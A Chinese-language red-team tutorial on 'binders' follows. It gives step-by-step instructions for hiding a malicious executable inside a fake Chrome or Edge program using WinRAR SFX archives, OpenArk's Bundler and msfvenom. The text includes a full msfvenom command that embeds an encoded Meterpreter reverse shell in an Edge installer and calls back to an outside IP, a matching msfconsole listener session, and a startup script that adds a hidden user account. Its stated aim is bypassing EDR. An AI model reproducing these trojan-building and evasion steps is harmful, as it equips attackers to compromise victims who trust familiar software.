# 捆绑程序

---

## 利用Winrar创建SFX(自解压)打包捆绑恶意程序与合法程序

> [X 上的 Binni Shah：“Embed A Malicious Executable in a Normal PDF or EXE : https://t.co/Uko8EQhzFj https://t.co/512NXzey0d” / X (twitter.com)](https://twitter.com/binitamshah/status/1784612260624932990)
>
> [在普通 PDF 或 EXE 中嵌入恶意可执行文件 |作者：萨姆·罗斯利斯伯格 |中等的 --- Embed A Malicious Executable in a Normal PDF or EXE | by Sam Rothlisberger | Medium](https://medium.com/@sam.rothlisberger/embed-a-malicious-executable-in-a-normal-pdf-or-exe-81ee5339707e)
>
> [WinRAR 归档程序，处理 RAR 和 ZIP 文件的强大工具 --- WinRAR archiver, a powerful tool to process RAR and ZIP files (rarlab.com)](https://www.rarlab.com/download.htm?source=post_page-----81ee5339707e--------------------------------)
>
> ----
>
> [自解压捆绑文件钓鱼 - the苍穹 - 博客园 (cnblogs.com)](https://www.cnblogs.com/thespace/p/15520945.html)

可以在 [WinRAR archiver, a powerful tool to process RAR and ZIP files (rarlab.com)](https://www.rarlab.com/download.htm?source=post_page-----81ee5339707e--------------------------------) 下载 WinRAR, 使用 Winrar 将恶意软件和合法软件捆绑起来, 通过合法软件调用恶意软件在一定程度上可以绕过EDR

可以在 [383 chrome icons - Iconfinder](https://www.iconfinder.com/search?q=chrome) 查找目标合法软件的图标并下载 PNG 文件

可以使用 `https://iconconverter.com` 将 PNG 转换成 ICO 图标

> 文中提到的这个网站我刚问不到, 拿 Go 写了个转换程序: [DailyNotesCode/Go/usecase/Picture/ToICO/main.go at main · Ayusummer/DailyNotesCode (github.com)](https://github.com/Ayusummer/DailyNotesCode/blob/main/Go/usecase/Picture/ToICO/main.go)
>
> 常见程序 ICO 分辨率:
>
> ![image-20240429162640096](http://cdn.ayusummer233.top/DailyNotes/image-20240429162640096.png)

选中 Chrome 浏览器快捷方式和恶意程序, 使用 WinRAR `Add to Archive` 来创建压缩包

![image-20240429150415492](http://cdn.ayusummer233.top/DailyNotes/image-20240429150415492.png)

起一个合适的名字, 例如 `Chrome.exe` 并确保选中了 `Create SFX archive`

![image-20240429151231670](http://cdn.ayusummer233.top/DailyNotes/image-20240429151231670.png)

继续在 `Advance -> SFX options -> Setup` 中配置启动项

![image-20240429151743366](http://cdn.ayusummer233.top/DailyNotes/image-20240429151743366.png)

> 如果你的恶意程序是阻塞性质的程序那么在写 `Run after extraction` 的时候如果恶意程序在前则会在其关闭时调起 Chrome, 反之则会在 Chrome 关闭后调起恶意程序

![image-20240429151758013](http://cdn.ayusummer233.top/DailyNotes/image-20240429151758013.png)

在 `Modes` 中设置解压到临时目录以及 `Hide all`

![image-20240429151843345](http://cdn.ayusummer233.top/DailyNotes/image-20240429151843345.png)

在 [383 chrome icons - Iconfinder](https://www.iconfinder.com/search?q=chrome) 查找目标合法软件的图标并下载 PNG 文件, 然后用工具转换成 ICO 文件并在 `Text and icon -> Load SFX icon from the file` 设置 ico 图标 

![image-20240429152043450](http://cdn.ayusummer233.top/DailyNotes/image-20240429152043450.png)

在 `Update` 中选择 `Extract and update files` 以及 `Overwrite all files`

![image-20240429152204461](http://cdn.ayusummer233.top/DailyNotes/image-20240429152204461.png)

最后逐级确定即可收获一个名为 `Chrome.exe` 且带有合适图标的可执行程序

![image-20240429152352945](http://cdn.ayusummer233.top/DailyNotes/image-20240429152352945.png)

此时执行 `Chrome.exe` 即可打开 Chrome 并执行恶意程序

> PS: 如果你的恶意程序是阻塞性质的程序那么在写 `Run after extraction` 的时候如果恶意程序在前则会在其关闭时调起 Chrome, 反之则会在 Chrome 关闭后调起恶意程序

![image-20240429153043430](http://cdn.ayusummer233.top/DailyNotes/image-20240429153043430.png)

---

### 相关链接

- [钓鱼姿势汇总 - 简书 (jianshu.com)](https://www.jianshu.com/p/dcd250593698)
- [常见钓鱼招式 - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/10339?time__1311=Cqjx2QD%3DiteWqGNDQimOgbtDtt0QtDReOYD)
- [红队攻防系列之花式鱼竿钓鱼篇 - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/7958?time__1311=n4%2BxnD0DyDu7%3D0KDtD%2FiW%2B%2BDRxWwET%2B2qiKYQx&u_atoken=b3f182c7de2346300545cf550b675aaa&u_asession=01aVloK8zdyz1jbLMCfi3Rb_nJ-DNhv22v_SsASnWdWOhSTG5nkI4iMtai7iaLZyHuJB-YY_UqRErInTL5mMzm-GyPlBJUEqctiaTooWaXr7I&u_asig=05gKuE463GuJgxD-1Hv2Y2uZaxRpUSO3DG9gh-nfltKMhcVUJcYDIKhn1cPVoXgiX5Df3xrlAPX8bST2J8VKtKoNwjn6RJZ9QRez5qff0CPQnpkgY-U-QL2U-ethMX_CJYuNKBFuPaIRLct_EkBTqITpoHnpM5IKnnIeTDjpFaYXXBzhvSc0Kr8URjOX9Xe4tkzFbVi2r-pBzp0QGXRl_7EMxyjhjxVMvGJkctdPlLhh8n4lDAq4p9hSzpFkmzwmT0xUBlYPVbTlxERd8HS2DtjMomX-SUxGBermG0wjWT8qJ6gx6UxFgdF3ARCQ86jS_u_XR5hatHQVh06VuUZ-D1wA&u_aref=N2juT3KkWH9z0pLtcs9KFrZ%2FzQw%3D)

---

## NSIS捆绑程序

> [捆绑马的制作 - yanq的个人博客 (saucer-man.com)](https://saucer-man.com/information_security/1168.html)



---

## OpenArk捆绑程序

> [制作一个捆绑程序 - OpenArk Manuals (blackint3.com)](https://openark.blackint3.com/manuals/CN/捆绑器/制作捆绑程序/)
>
> [OpenArk/doc/README-zh.md at master · BlackINT3/OpenArk · GitHub](https://github.com/BlackINT3/OpenArk/blob/master/doc/README-zh.md)

OpenArk是一款Windows平台上的开源Ark工具. Ark是Anti-Rootkit（对抗恶意程序）的简写, OpenArk目标成为逆向工程师、编程人员的工具，同时也能为那些希望清理恶意软件的用户服务。

可以在 [Releases · BlackINT3/OpenArk (github.com)](https://github.com/BlackINT3/OpenArk/releases/) 下载 OpenArk

捆绑程序是将一个或多个程序绑定成一个独立的exe，避免依赖的文件（如DLL）过多而影响传输/存储，常用于一些恶意软件。 OpenArk的Bundler即是这样一个功能，支持文件以及文件夹等捆绑成一个exe，同样支持脚本。

---

### 制作步骤

[制作一个捆绑程序 - OpenArk Manuals (blackint3.com)](https://openark.blackint3.com/manuals/CN/捆绑器/制作捆绑程序/) 文档中讲述了捆绑合法程序以及新建用户命令和vbs.bat脚本的方法, 这里演示捆绑合法程序和恶意程序

这里选择捆绑恶意程序和 MSEdge, edge 直接捆绑个快捷方式就行了, 将恶意程序和 edge快捷方式放到一个文件夹中并将该文件夹拖入到 OpenArk 的 Bundler 中(默认管理员)(或者使用右上角`选择文件夹` 按钮指定目标文件夹)

![image-20240717111536127](http://cdn.ayusummer233.top/DailyNotes/202407171115466.png)

在左下角 `启动脚本` 区域写入要执行的脚本, 例如这里应当是启动恶意程序以及合法程序

```
call %root%/./msedge.exe
call %root%/./Microsoft Edge.lnk
clean //清理释放后的文件
```

> PS: 一些额外启动脚本代码示例:
>
> ```
> cmd net user shadow 123 /add     //添加一个用户shadow
> start cmd /c %root%\shadow.bat   //执行测试的bat
> start wscript %root%\shadow.vbs  //执行测试vbs
> ```

---

点击左下角 `选择图标` 按钮选择生成程序的图标然后点击右下角的 `生成` 按钮即可生成捆绑程序

![image-20240717112857786](http://cdn.ayusummer233.top/DailyNotes/202407171128899.png)

![image-20240717113544992](http://cdn.ayusummer233.top/DailyNotes/202407171135121.png)

![image-20240717113610390](http://cdn.ayusummer233.top/DailyNotes/202407171136547.png)

---

## msfvenom捆绑程序

> [msf之木马程序-腾讯云开发者社区-腾讯云 (tencent.com)](https://cloud.tencent.com/developer/article/1699911)
>
> [【渗透测试笔记】之【钓鱼姿势——exe捆绑与免杀】-CSDN博客](https://blog.csdn.net/qq_44874645/article/details/118525837)

准备好目标程序(这里选择了Microsoft Edge安装包, 放在了 `/root/temp/MicrosoftEdgeSetup.exe`)

使用 msfvenom 生成捆绑木马

```bash
msfvenom -p windows/meterpreter/reverse_http lhost=100.1.1.131 lport=55555 -e x86/shikata_ga_nai -i 15 -f exe -b '\x00\x0a\x0d' -x /root/temp/MicrosoftEdgeSetup.exe > /root/temp/out/MicrosoftEdgeSetup.exe
```

- `-p`：指定后面的 payload

  `windows/meterpreter/reverse_tcp`：申明这是一个windows系统下的一个反弹http

- `LHOST=192.168.0.108,`：设置反弹回来的ip，即你的kali的ip地址

- `lport` 反弹端口(默认返回端口是4444)

- `-e`: 指定编码器 `x86/shikata_ga_nai`

- `-i`: 指定编码次数

- `-f`： 捆绑的文件类型，这里是一个exe文件

- `-b`:  指定需要避开的坏字符（通常是由于这些字符在payload中会引起问题）

  这里是避免使用`\x00`（null字节）、`\x0a`（换行符）和`\x0d`（回车符）。

- `-x`：指定捆绑的文件路径

- `-o`：指定生成木马的文件路径

![image-20240717144916986](http://cdn.ayusummer233.top/DailyNotes/202407171449258.png)

`msconsole` 起监听

```bash
msfconsole
msf6 > use multi/handler
[*] Using configured payload generic/shell_reverse_http
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set lhost 100.1.1.131
lhost => 100.1.1.131
msf6 exploit(multi/handler) > set lport 55555
lport => 55555
msf6 exploit(multi/handler) > run
```

靶机执行生成的捆绑程序即可上线

![image-20240717162355294](http://cdn.ayusummer233.top/DailyNotes/202407171623638.png)

---

或者 CS 起个 http 监听器挂在 55555 端口, 靶机运行捆绑木马即可上线 CS

![image-20240717162459264](http://cdn.ayusummer233.top/DailyNotes/202407171624408.png)

---

